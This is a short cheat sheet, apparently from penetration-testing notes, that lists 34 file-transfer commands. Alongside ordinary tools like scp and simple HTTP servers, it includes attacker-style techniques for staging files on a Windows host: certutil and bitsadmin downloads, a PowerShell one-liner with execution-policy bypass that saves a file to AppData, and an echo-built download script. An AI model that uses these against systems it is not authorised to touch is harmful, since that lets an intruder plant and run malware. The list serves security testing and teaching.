# File Transfer

| No. | Command |
|-----|---------|
| 1   | `wget http://$IP/file -O /tmp/test.tmp` |
| 2   | `curl http://$IP/file` |
| 3   | `fetch http://$IP/file` |
| 4   | `nc $IP $port > outfile` |
| 5   | `nc -lnvp $port < infile` |
| 6   | `ftp -s:input.txt` |
| 7   | `ftp $ip` |
| 8   | `get $filename` |
| 9   | `sudo apt install python-pyftpdlib` |
| 10  | `sudo python -m pyftpdlib -p 21` |
| 11  | `python -m SimpleHTTPServer 80` |
| 12  | `python -m http.server 80` |
| 13  | `curl -O http://$ip/putty.exe` |
| 14  | `python smbserver.py ata /root/share` |
| 15  | `[WIN+R] \\$ip` |
| 16  | `apt install smbclient` |
| 17  | `smbclient -L $ip` |
| 18  | `smbclient //$ip/ata` |
| 19  | `(new-object System.Net.WebClient).DownloadFile('//$ip/putty.exe', 'd:\\data\\putty.exe')` |
| 20  | `bitsadmin /transfer job //example.com/path/putty.exe F:\\putty.exe` |
| 21  | `php -S 0.0.0.0:80` |
| 22  | `scp $filename user@host:~/path_dir` |
| 23  | `scp $filename $username@$ip:~/` |
| 24  | `python -m pyftpdlib 21` |
| 25  | `ftp $ip` |
| 26  | `bitsadmin /transfer download /priority normal http://$ip/file C:\\output\\path` |
| 27  | `powershell.exe -exec bypass -Command “& {iex((New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/$filename','C:\\Users\\user\\AppData\\Local\\ack.exe'));}”` |
| 28  | `certutil -urlcache -split -f “http://$ip/$filename" $filename` |
| 29  | `echo $storageDir = $pwd > wget.ps1` |
| 30  | `echo $webclient = New-Object System.Net.WebClient >> wget.ps1` |
| 31  | `echo $url = "http://$ip/$filename" >> wget.ps1` |
| 32  | `echo $filename = "filename" >> wget.ps1` |
| 33  | `echo $webclient.DownloadFile($url,$filename) >> wget.ps1` |
| 34  | `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File $filename` |
